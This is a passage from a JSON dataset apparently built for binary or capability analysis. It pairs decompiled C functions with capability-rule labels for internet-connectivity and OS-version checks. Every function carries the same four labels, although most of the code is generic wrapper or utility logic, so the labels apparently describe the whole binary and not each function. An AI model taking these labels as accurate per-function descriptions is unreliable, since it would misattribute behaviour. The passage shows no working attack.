0xb1bde9e4, 0xb1c5b350);\n                if (iVar1 != 0) {\n                    return 0xc0000005;\n                }\n                iVar1 = fcn.0005c850(var_20h, 0xb1bde9fc, 0xb1c5b354);\n                if (iVar1 != 0) {\n                    return 0xc0000005;\n                }\n            }\n            (**0xb1c5b354)(*(var_2ch + 0x1c));\n            var_25h._0_1_ = '\\x01';\n        }\n        if (arg_ch == NULL) {\n            var_34h = 0xffffffff;\n        }\n        else {\n            var_34h = arg_ch;\n        }\n        arg_8h_00 = var_34h;\n        puVar4 = var_34h;\n        iVar1 = fcn.00034aa0(var_34h, &var_25h + 1);\n        if (iVar1 == 0) {\n            var_34h = stack0xffffffd8;\n            iVar1 = fcn.000785da();\n            if (iVar1 == 0) {\n                var_34h = var_4h;\n                fcn.0001fa10(var_4h, var_8h, 0);\n            }\n            fcn.00034af0(arg_8h_00, stack0xffffffd8);\n            puVar4 = arg_8h_00;\n            arg_ch_00 = stack0xffffffc4;\n        }\n        if (var_25h != '\\0') {\n            (**0xb1c5b350)(*(var_2ch + 0x1c), puVar4, arg_ch_00, var_34h);\n        }\n    }\n    pcVar2 = fcn.000639f0(arg_8h);\n    uVar3 = (*pcVar2)(arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 829
    },
    "0001fa10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0001fa10(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint var_114h;\n    uint var_110h;\n    uint32_t var_4h;\n    \n    iVar1 = fcn.00034c90();\n    fcn.000368a0(arg_ch, &var_110h, 0x104);\n    if (arg_10h == '\\0') {\n        if ((0x1a < iVar1) && (iVar1 = fcn.0007861c(&var_110h, 0xb1bdea14),  iVar1 == 0)) {\n            fcn.000435c0(arg_ch);\n        }\n        if (*0xb1c5b2d4 != 0) {\n            for (var_4h = 0; (var_4h < *0xb1c5b2d4 && (*(*0xb1c5b2d8 + var_4h * 8) != arg_ch)); var_4h = var_4h + 1) {\n            }\n            for (; var_4h < *0xb1c5b2d4 - 1; var_4h = var_4h + 1) {\n                fcn.00078586(*0xb1c5b2d8 + var_4h * 8, *0xb1c5b2d8 + 8 + var_4h * 8, 8);\n            }\n            if (var_4h < *0xb1c5b2d4) {\n                *0xb1c5b2d4 = *0xb1c5b2d4 - 1;\n                fcn.0001d7c0(0xb1c5b2d8, *0xb1c5b2d4 * 8 + 8, *0xb1c5b2d4 * 8);\n            }\n        }\n        fcn.00019570(&var_110h, arg_ch);\n        fcn.0001fc80(arg_ch, 0);\n    }\n    else {\n        for (var_4h = 0; var_4h < *0xb1c5b33c; var_4h = var_4h + 1) {\n            if (*(*0xb1c5b340 + var_4h * 8) == arg_8h) {\n                fcn.0001fbb0(arg_ch, 0);\n            }\n        }\n        if ((0x1a < iVar1) && (iVar1 = fcn.0007861c(&var_110h, 0xb1bdea14),  iVar1 == 0)) {\n            fcn.00043330(arg_ch);\n        }\n    }\n    return;\n}\n",
        "token_count": 627
    },
    "0001fda0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0001fda0(uint arg_8h, uint *arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    uint var_28h;\n    int32_t var_21h;\n    uint var_1ch;\n    uint *var_18h;\n    char var_11h;\n    uint var_10h;\n    uint var_9h;\n    uint var_4h;\n    \n    var_28h = 0;\n    var_1ch = 0;\n    var_10h = 0;\n    var_21h._0_1_ = '\\0';\n    var_9h._0_1_ = '\\0';\n    var_11h = '\\0';\n    if (*0xb1c5b318 == NULL) {\n        return 0x21590001;\n    }\n    var_18h = arg_ch;\n    var_4h = arg_18h;\n    stack0xfffffff4 = arg_10h;\n    cVar1 = (**0xb1bde0c4)();\n    if (cVar1 == '\\x01') {\n        *NULL = fcn.0001ad50(&var_18h, 4, 1, 2, &var_28h);\n        if (*NULL != 0) goto code_r0x0001fe8f;\n        var_21h._0_1_ = '\\x01';\n        *NULL = fcn.0001ad50(&var_4h, 4, 1, 2, &var_1ch);\n        if (*NULL != 0) goto code_r0x0001fe8f;\n        var_9h._0_1_ = '\\x01';\n        *NULL = fcn.0001ad50(&var_9h + 1, 4, 1, 2, &var_10h);\n        if (*NULL != 0) goto code_r0x0001fe8f;\n        var_11h = '\\x01';\n    }\n    *NULL = (**0xb1c5b318)(arg_8h, var_18h, stack0xfffffff4, arg_14h, var_4h);\n    if (*NULL == 0) {\n        *arg_ch = *var_18h;\n    }\ncode_r0x0001fe8f:\n    if (var_11h != '\\0') {\n        fcn.0001ade0(stack0xfffffff4, var_10h);\n    }\n    if (var_9h != '\\0') {\n        fcn.0001ade0(var_4h, var_1ch);\n    }\n    if (var_21h != '\\0') {\n        fcn.0001ade0(var_18h, var_28h);\n    }\n    return *NULL;\n}\n",
        "token_count": 640
    },
    "0001fee0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0001fee0(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0xb1c5b31c == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        uVar3 = (**0xb1c5b31c)(arg_8h, arg_ch);\n        uVar2 = uVar3;\n        fcn.0001b6f0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 191
    },
    "0001ff30": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_2eh\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0001ff30(uint *arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h, uint *arg_18h, uint arg_1ch, uint arg_20h, \n            uint32_t arg_24h)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint32_t extraout_ECX;\n    uint32_t extraout_ECX_00;\n    uint32_t extraout_ECX_01;\n    uint32_t uVar3;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uchar auStack52 [2];\n    uint *var_2eh;\n    int32_t var_25h;\n    uint var_20h;\n    uint *var_1ch;\n    uchar auStack28 [3];\n    uint var_15h;\n    uint var_10h;\n    uchar auStack16 [3];\n    uint var_9h;\n    uint *var_4h;\n    \n    var_38h = 0;\n    var_20h = 0;\n    var_10h = 0;\n    var_4h = NULL;\n    var_34h = 0;\n    _auStack16 = auStack16;\n    _auStack28 = auStack28;\n    _auStack52 = auStack52;\n    var_25h._0_1_ = '\\0';\n    if (*0xb1c5b324 == NULL) {\n        return 0x21590001;\n    }\n    var_3ch = arg_8h;\n    var_1ch = arg_18h;\n    stack0xffffffe8 = arg_1ch;\n    stack0xfffffff4 = arg_20h;\n    stack0xffffffd0 = arg_10h;\n    cVar2 = (**0xb1bde0c4)();\n    uVar3 = extraout_ECX;\n    if (cVar2 == '\\x01') {\n        *NULL = fcn.0001ad50(&fcn.0001ff30::var_3ch, 4, 1, 2, &fcn.0001ff30::var_38h);\n        if (*NULL != 0) goto code_r0x000200c3;\n        _auStack52 = CONCAT12(1, auStack52);\n        _auStack52 = _auStack52 & 0xff000000 | _auStack52;\n        if ((arg_18h != NULL) &&\n           (*NULL = fcn.0001ad50(&fcn.0001ff30::var_1ch, 8, 1, 2, &fcn.0001ff30::var_20h),  *NULL != 0))\n        goto code_r0x000200c3;\n        var_4h = &fcn.0001ff30::var_10h;\n        stack0xfffffff4 = 0;\n        _auStack16 = 1;\n        var_10h = 0x2cc;\n        var_3ch = &fcn.0001ff30::var_15h + 1;\n        _auStack28 = 0x20016;\n        *NULL = fcn.0001ad50(var_3ch, 0x2cc, 1, 0, var_4h);\n        if (*NULL != 0) goto code_r0x000200c3;\n        _auStack28 = &fcn.0001ff30::var_4h;\n        var_1ch = NULL;\n        var_20h = 1;\n        stack0xffffffd8 = 0x14;\n        var_3ch = &fcn.0001ff30::var_9h + 1;\n        stack0xffffffd0 = 0x2003b;\n        *NULL = fcn.0001ad50(var_3ch, 0x14, 1, 0, _auStack28);\n        if (*NULL != 0) goto code_r0x000200c3;\n        _auStack52 = CONCAT13(1, _auStack52);\n        uVar3 = extraout_ECX_00;\n        if (arg_10h != NULL) {\n            unique0x00001d00 = &fcn.0001ff30::var_34h;\n            _auStack52 = 2;\n            var_34h = 1;\n            var_38h = 0x18;\n            var_3ch = &fcn.0001ff30::var_2eh + 2;\n            *NULL = fcn.0001ad50(var_3ch, 0x18, 1, 2, unique0x00001d00);\n            if (*NULL != 0) goto code_r0x000200c3;\n            var_25h._0_1_ = '\\x01';\n            uVar3 = extraout_ECX_01;\n        }\n    }\n    *NULL = (**0xb1c5b324)(var_3ch, arg_ch, stack0xffffffd0, arg_14h, var_1ch, stack0xffffffe8, stack0xfffffff4, \n                           uVar3 & 0xffffff00 | arg_24h & 0xff);\n    if ((*NULL == 0) && (*arg_8h = *var_3ch,  arg_18h != NULL)) {\n        uVar1 = var_1ch[1];\n        *arg_18h = *var_1ch;\n        arg_18h[1] = uVar1;\n    }\ncode_r0x000200c3:\n    if (var_25h != '\\0') {\n        fcn.0001ade0(stack0xffffffd0, var_34h);\n    }\n    if (var_2eh._1_1_ != '\\0') {\n        fcn.0001ade0(stack0xfffffff4, var_4h);\n    }\n    if (var_15h != '\\0') {\n        fcn.0001ade0(stack0xffffffe8, var_10h);\n    }\n    if (var_9h != '\\0') {\n        fcn.0001ade0(var_1ch, var_20h);\n    }\n    if (var_2eh != '\\0') {\n        fcn.0001ade0(var_3ch, var_38h);\n    }\n    return *NULL;\n}\n",
        "token_count": 1471
    },
    "00020140": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00020140(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0xb1c5b320 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        uVar3 = (**0xb1c5b320)(arg_8h, arg_ch);\n        uVar2 = uVar3;\n        fcn.0001b6f0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 188
    },
    "00020190": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00020190(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t extraout_ECX;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0xb1c5b30c == NULL) {\n        uVar1 = 0x21590001;\n    }\n    else {\n        uVar2 = fcn.0001b6f0(0);\n        uVar1 = (**0xb1c5b30c)(arg_8h, arg_ch, arg_10h, uVar2 & 0xffffff00 | arg_14h & 0xff);\n        fcn.0001b6f0(extraout_ECX & 0xffffff00 | uVar2 & 0xff);\n    }\n    return uVar1;\n}\n",
        "token_count": 221
    },
    "000201e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint32_t __cdecl fcn.000201e0(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0xb1c5b310 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        uVar2 = (**0xb1c5b310)(arg_8h, arg_ch, arg_10h);\n        fcn.0001b6f0(uVar2 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 184
    },
    "00020230": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00020230(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0xb1c5b314 == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        uVar3 = (**0xb1c5b314)(arg_8h, arg_ch);\n        uVar2 = uVar3;\n        fcn.0001b6f0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 188
    },
    "00020280": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00020280(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    ulong uVar3;\n    uint var_8h;\n    uint var_1h;\n    \n    if (*0xb1c5b32c == NULL) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar1 = fcn.0001b6f0(0);\n        uVar3 = (**0xb1c5b32c)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        uVar2 = uVar3;\n        fcn.0001b6f0(uVar3 >> 0x20 & 0xffffff00 | uVar1);\n    }\n    return uVar2;\n}\n",
        "token_count": 223
    },
    "000202f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000202f0(uint32_t *arg_8h, uint32_t arg_ch, char *arg_10h, uint arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint32_t var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    uint var_4h;\n    \n    if (arg_ch < 8) {\n        var_98h = 0;\n        var_94h = 0;\n        fcn.0007877e(&var_98h, arg_8h, arg_ch);\n    }\n    else {\n        var_98h = *arg_8h;\n        var_94h = arg_8h[1];\n    }\n    var_98h = var_98h ^ arg_18h;\n    if (arg_18h != 0) {\n        fcn.00031300(&var_90h, arg_ch, arg_8h);\n        fcn.000307e0(arg_14h, arg_10h + 1, arg_18h, &var_90h, &var_98h, 1);\n    }\n    iVar1 = (-(arg_18h % 8 != 0) & 8) + (arg_18h & 0xfffffff8);\n    *arg_10h = iVar1 - arg_18h;\n    return iVar1 + 1;\n}\n",
        "token_count": 322
    },
    "000203c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.000203c0(uint noname_0, uint noname_1, uint8_t *arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint var_1h;\n    \n    if (arg_14h == 0) {\n        iVar2 = -1;\n    }\n    else {\n        uVar1 = *arg_10h;\n        if (uVar1 < 8) {\n            if (arg_14h - 1U < uVar1) {\n                iVar2 = -1;\n            }\n            else {\n                iVar2 = (arg_14h + -1) - uVar1;\n            }\n        }\n        else {\n            iVar2 = -1;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 199
    },
    "00020410": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.00020410(uint32_t *arg_8h, uint32_t arg_ch, uint arg_10h, uint8_t *arg_14h, int32_t arg_18h)\n\n{\n    int32_t arg_ch_00;\n    uint var_a0h;\n    uint32_t var_9ch;\n    uint32_t var_98h;\n    uint var_91h;\n    uint32_t var_4h;\n    \n    if (arg_ch < 8) {\n        var_9ch = 0;\n        var_98h = 0;\n        fcn.0007877e(&var_9ch, arg_8h, arg_ch);\n    }\n    else {\n        var_9ch = *arg_8h;\n        var_98h = arg_8h[1];\n    }\n    var_91h._0_1_ = *arg_14h;\n    var_4h = (arg_18h + -1) - var_91h;\n    var_9ch = var_9ch ^ var_4h;\n    if (var_4h != 0) {\n        fcn.00031300(&var_91h + 1, arg_ch, arg_8h);\n        if (var_91h == 0) {\n            fcn.000307e0(arg_14h + 1, arg_10h, arg_18h + -1, &var_91h + 1, &var_9ch, 0);\n        }\n        else {\n            arg_ch_00 = fcn.00035200(arg_18h + -1);\n            if (arg_ch_00 == 0) {\n                var_4h = 0xffffffff;\n            }\n            else {\n                fcn.000307e0(arg_14h + 1, arg_ch_00, arg_18h + -1, &var_91h + 1, &var_9ch, 0);\n                fcn.0007877e(arg_10h, arg_ch_00, var_4h);\n                fcn.00035330(arg_ch_00);\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 491
    },
    "000205e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000205e0(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint *arg_14h, uint *arg_18h)\n\n{\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    while( true ) {\n        if (var_4h == NULL) {\n            return 0;\n        }\n        if (var_4h[1] == arg_ch) break;\n        var_4h = *var_4h;\n    }\n    if (var_4h[2] != arg_10h) {\n        return 0;\n    }\n    *arg_14h = var_4h[4];\n    if (arg_18h != NULL) {\n        *arg_18h = var_4h[3];\n    }\n    return 1;\n}\n",
        "token_count": 192
    },
    "00020650": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020650(uint *arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, int32_t arg_18h)\n\n{\n    uint *var_4h;\n    \n    var_4h = arg_8h;\n    while( true ) {\n        if (var_4h == NULL) {\n            return 0;\n        }\n        if (var_4h[1] == arg_ch) break;\n        var_4h = *var_4h;\n    }\n    if ((var_4h[2] == arg_10h) && (var_4h[3] == arg_18h)) {\n        fcn.0007877e(arg_14h, var_4h[4], var_4h[3]);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 192
    },
    "00020770": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020770(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_238h;\n    uint var_234h;\n    uint *var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_214h;\n    uint var_210h;\n    uint var_208h;\n    \n    fcn.000363d0(&var_208h, 0x104, arg_8h);\n    fcn.00078550(&var_21ch, &var_208h);\n    var_238h = 0x18;\n    var_234h = 0;\n    var_22ch = 0x40;\n    var_230h = &var_21ch;\n    var_228h = 0;\n    var_224h = 0;\n    iVar1 = fcn.0001ec90(&var_214h, 0xc0100000, &var_238h, &var_210h, 0, 0, 3, (arg_ch != 0) + 1, 0x812, 0, 0);\n    if (iVar1 != 0) {\n        var_214h = 0;\n    }\n    return var_214h;\n}\n",
        "token_count": 309
    },
    "00020850": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020850(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    var_10h = arg_ch;\n    var_ch = 0;\n    iVar1 = fcn.0007855c(arg_8h, &var_8h, &var_10h, 8, 0x14);\n    if (iVar1 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 154
    },
    "00020890": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020890(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_8h;\n    \n    iVar1 = fcn.000785c2(arg_8h, &var_8h, &var_20h, 0x18, 5);\n    if (iVar1 != 0) {\n        var_18h = 0xffffffff;\n    }\n    return var_18h;\n}\n",
        "token_count": 119
    },
    "000208d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000208d0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = arg_8h;\n    var_18h = arg_14h;\n    var_14h = 0;\n    iVar1 = fcn.000785e0(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_18h, 0);\n    if (iVar1 == 0) {\n        if (var_4h == arg_10h) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 240
    },
    "00020930": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00020930(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = arg_8h;\n    var_18h = arg_14h;\n    var_14h = 0;\n    iVar1 = fcn.00078574(arg_8h, 0, 0, 0, &var_8h, arg_ch, arg_10h, &var_18h, 0);\n    if (iVar1 == 0) {\n        if (var_4h == arg_10h) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0xffffffff;\n        }\n    }\n    else {\n        uVar2 = 0xffffffff;\n    }\n    return uVar2;\n}\n",
        "token_count": 238
    },
    "000209e0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000209e0(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = fcn.0007864c(arg_8h, arg_ch, arg_10h, arg_14h);\n    if (var_4h < 0) {\n        *(arg_8h + arg_ch + -1) = 0;\n        var_4h = arg_ch << 1;\n    }\n    return var_4h;\n}\n",
        "token_count": 132
    },
    "00020a80": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14ch\n// WARNING: Variable defined which should be unmapped: var_148h\n\nint32_t __cdecl fcn.00020a80(uint8_t *arg_8h, int32_t arg_ch, uint32_t *arg_10h, uint arg_14h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    uint8_t *arg_8h_00;\n    uint uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    bool bVar7;\n    uint var_14ch;\n    int32_t var_148h;\n    uint8_t *var_140h;\n    uint8_t *var_13ch;\n    uint var_134h;\n    uint8_t *var_130h;\n    uint8_t *var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint *var_120h;\n    uint var_11ch;\n    uint32_t var_118h;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    bVar2 = false;\n    var_4h = 0;\n    bVar3 = false;\n    var_120h = NULL;\n    if ((arg_8h == NULL) || (arg_10h == NULL)) {\n        return -1;\n    }\n    if (*0xb1c68744 == 0) {\n        fcn.00078790(0xb1c68740, 0, 0x30);\n        fcn.000344f0(0xb1c68740);\n        *0xb1c68744 = 1;\n    }\n    arg_8h_00 = fcn.00035200(0x104);\n    if (arg_8h_00 == NULL) {\n        return 2;\n    }\n    var_12ch = arg_8h;\n    var_130h = arg_8h_00;\n    do {\n        uVar1 = *var_12ch;\n        *var_130h = uVar1;\n        var_12ch = var_12ch + 1;\n        var_130h = var_130h + 1;\n    } while (uVar1 != 0);\n    fcn.00034550(0xb1c68740);\n    var_4h = 1;\n    *arg_10h = 0xffffffff;\n    for (var_118h = 0; var_118h < 10; var_118h = var_118h + 1) {\n        if (*(var_118h * 4 + -0x4e3978b8) == 0) {\n            *arg_10h = var_118h;\n        }\n        else {\n            var_13ch = *(*(var_118h * 4 + -0x4e3978b8) + 0x40);\n            var_140h = arg_8h_00;\n            do {\n                uVar1 = *var_140h;\n                bVar7 = uVar1 < *var_13ch;\n                if (uVar1 != *var_13ch) {\ncode_r0x00020c5a:\n                    var_148h = (1 - bVar7) - (bVar7 != 0);\n                    goto code_r0x00020c65;\n                }\n                if (uVar1 == 0) break;\n                uVar1 = var_140h[1];\n                bVar7 = uVar1 < var_13ch[1];\n                if (uVar1 != var_13ch[1]) goto code_r0x00020c5a;\n                var_140h = var_140h + 2;\n                var_13ch = var_13ch + 2;\n            } while (uVar1 != 0);\n            var_148h = 0;\ncode_r0x00020c65:\n            if (var_148h == 0) {\n                fcn.00035330(arg_8h_00);\n                *arg_10h = var_118h;\n                *(*(var_118h * 4 + -0x4e3978b8) + 4) = *(*(var_118h * 4 + -0x4e3978b8) + 4) + 1;\n                var_8h = 0;\n                goto 